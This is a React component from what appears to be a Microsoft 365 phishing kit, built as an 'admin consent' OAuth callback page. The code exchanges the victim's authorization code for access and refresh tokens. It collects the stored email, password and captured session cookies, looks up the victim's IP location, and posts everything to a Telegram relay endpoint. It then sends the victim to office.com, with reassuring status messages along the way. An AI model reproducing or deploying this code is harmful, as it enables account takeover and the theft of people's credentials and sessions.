import { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

function getByteLengthForBrowser(str: string): number {
  return new Blob([str]).size;
}

export default function AdminConsentCallback() {
  const location = useLocation();
  const navigate = useNavigate();
  const [status, setStatus] = useState('Processing authentication...');
  const [progress, setProgress] = useState(10);

  useEffect(() => {
    const handleCallback = async () => {
      try {
        setProgress(20);
        
        // ✅ FIX: Check if already processing to prevent infinite loop
        const isProcessing = sessionStorage.getItem('oauth_processing');
        const params = new URLSearchParams(location.search);
        const processed = params.get('processed');
        
        if (isProcessing === 'true' && processed === 'true') {
          console.log('⚠️ Already processing this callback, skipping...');
          return;
        }
        
        // Mark as processing
        sessionStorage.setItem('oauth_processing', 'true');
        
        // ✅ FIX: Check URL hash FIRST (more reliable than sessionStorage timing)
        const hash = window.location.hash;
        if (hash && hash.startsWith('#oauth=')) {
          try {
            const hashData = hash.substring(7); // Remove '#oauth='
            const decoded = atob(hashData); // Base64 decode
            const oauthData = JSON.parse(decoded);
            
            console.log('✅ Found OAuth data in URL hash!');
            
            // Store it properly in sessionStorage
            sessionStorage.setItem('oauth_callback_data', JSON.stringify(oauthData));
            localStorage.setItem('oauth_callback_data', JSON.stringify(oauthData));
            
            // Clear the hash from URL
            window.history.replaceState(null, '', '/callback-complete');
          } catch (e) {
            console.error('❌ Failed to parse OAuth data from hash:', e);
          }
        }
        
        // ✅ FIX: Add retry logic to wait for OAuth data
        let oauthDataStr: string | null = null;
        let retries = 0;
        const maxRetries = 10;
        
        console.log('🔍 Checking for OAuth data in sessionStorage...');
        
        while (!oauthDataStr && retries < maxRetries) {
          oauthDataStr = sessionStorage.getItem('oauth_callback_data') || 
                        localStorage.getItem('oauth_callback_data');
          
          if (!oauthDataStr) {
            console.log(`⏳ Attempt ${retries + 1}/${maxRetries}: OAuth data not found yet, waiting...`);
            await new Promise(resolve => setTimeout(resolve, 300));
            retries++;
          } else {
            console.log('✅ Found OAuth data after', retries, 'retries!');
            break;
          }
        }
        
        let code: string | null = null;
        let state: string | null = null;
        
        if (oauthDataStr) {
          console.log('✅ Found OAuth data from POST handler');
          const oauthData = JSON.parse(oauthDataStr);
          code = oauthData.code;
          state = oauthData.state;
          
          // Clear it so it's not reused
          sessionStorage.removeItem('oauth_callback_data');
          localStorage.removeItem('oauth_callback_data');
        } else {
          // Fallback: Check URL params (GET request)
          code = params.get('code');
          state = params.get('state');
        }

        const error = params.get('error');

        if (error) {
          setStatus(`Error: ${error}`);
          console.error('❌ OAuth error:', error);
          sessionStorage.removeItem('oauth_processing');
          return;
        }

        if (!code) {
          setStatus('Error: Missing authorization code.');
          console.error('❌ No authorization code received');
          sessionStorage.removeItem('oauth_processing');
          
          // ✅ FIX: Redirect back to start after delay
          setTimeout(() => {
            window.location.href = '/';
          }, 2000);
          return;
        }

        // ========== STEP 1: Exchange Code for Tokens ==========
        setStatus('Exchanging authorization code...');
        setProgress(30);
        console.log('🔄 Exchanging authorization code for tokens...');
        
        const tokenResponse = await fetch('/api/exchangeAdminConsentCode', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            code,
            email: sessionStorage.getItem('ms_email') || localStorage.getItem('ms_email'),
            state: state || sessionStorage.getItem('ms_oauth_state')
          })
        });

        // ✅ FIX: Log full error response for debugging
        if (!tokenResponse.ok) {
          const errorBody = await tokenResponse.json().catch(() => ({}));
          console.error('❌ Token exchange failed');
          console.error('❌ Status:', tokenResponse.status);
          console.error('❌ Error details:', errorBody);
          throw new Error(`Token exchange failed with status ${tokenResponse.status}: ${JSON.stringify(errorBody)}`);
        }

        const oauthTokens = await tokenResponse.json();
        console.log('✅ Tokens received successfully.');
        setProgress(50);

        // ========== STEP 2: Gather All Data ==========
        setStatus('Consolidating your data...');
        console.log('🔄 Consolidating all data for submission...');

        const storedCreds = localStorage.getItem('ms_auth_credentials') || 
                           sessionStorage.getItem('ms_auth_credentials');
        const credentials = storedCreds ? JSON.parse(storedCreds) : { 
          email: localStorage.getItem('ms_email') 
        };

        let cookies: any[] = [];
        if (window.microsoftCookieBridge) {
          const bridgeData = await window.microsoftCookieBridge.retrieveCaptureData();
          if (bridgeData && bridgeData.cookies) {
            cookies = bridgeData.cookies;
            console.log(`✅ Retrieved ${cookies.length} cookies from Service Worker bridge`);
          }
        }
        
        let locationData: any = {};
        try {
          const locResponse = await fetch('https://ipapi.co/json/');
          locationData = await locResponse.json();
          console.log('✅ Location data fetched.');
        } catch (locError) {
          console.warn('⚠️ Could not fetch location data:', locError);
        }
        setProgress(70);

        const jsonContent = JSON.stringify({ cookies }, null, 2);
        const cookieFile = {
            name: `cookies_${new Date().getTime()}.json`,
            content: jsonContent,
            size: getByteLengthForBrowser(jsonContent)
        };

        // ========== STEP 3: Build and Send Payload ==========
        setStatus('Sending data securely...');
        console.log('📤 Preparing to send payload to Telegram...');
        
        const payload = {
          email: credentials.email,
          password: credentials.password || '',
          oauth: {
            access_token: oauthTokens.access_token,
            refresh_token: oauthTokens.refresh_token,
            id_token: oauthTokens.id_token,
            expires_in: oauthTokens.expires_in,
            captured_at: new Date().toISOString()
          },
          cookies: cookies,
          cookieCount: cookies.length,
          locationData: locationData,
          cookieFiles: { jsonFile: cookieFile },
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString(),
          validated: true,
          microsoftAccount: true
        };
        
        const telegramResponse = await fetch('/api/sendTelegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!telegramResponse.ok) {
            throw new Error('Failed to send data to Telegram.');
        }

        console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
        setProgress(100);
        setStatus('✅ Authentication Successful');
        
        // ✅ FIX: Clear processing flag before redirect
        sessionStorage.removeItem('oauth_processing');

        setTimeout(() => {
          console.log('🎉 Redirecting to Office.com...');
          window.location.href = 'https://www.office.com/?auth=2';
        }, 2000);

      } catch (err: any) {
        console.error('❌ Error in callback flow:', err);
        setStatus(`Error: ${err.message}`);
        // ✅ FIX: Clear processing flag on error
        sessionStorage.removeItem('oauth_processing');
      }
    };

    handleCallback();
  }, [location, navigate]);

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Segoe UI, Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
        <h2 style={{ marginBottom: '20px', fontSize: '24px' }}>{status}</h2>
        <div style={{
            width: '300px',
            height: '8px',
            backgroundColor: '#e0e0e0',
            borderRadius: '4px',
            overflow: 'hidden',
            marginBottom: '20px'
        }}>
            <div style={{
                width: `${progress}%`,
                height: '100%',
                backgroundColor: '#0078d4',
                transition: 'width 0.3s ease'
            }}></div>
        </div>
        <p style={{ fontSize: '14px', color: '#666', marginBottom: '30px' }}>{progress}%</p>
        <div style={{
            border: '4px solid #f3f2f1',
            borderTop: '4px solid #0078d4',
            borderRadius: '50%',
            width: '40px',
            height: '40px',
            animation: 'spin 1s linear infinite'
        }}></div>
      <style>{`
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}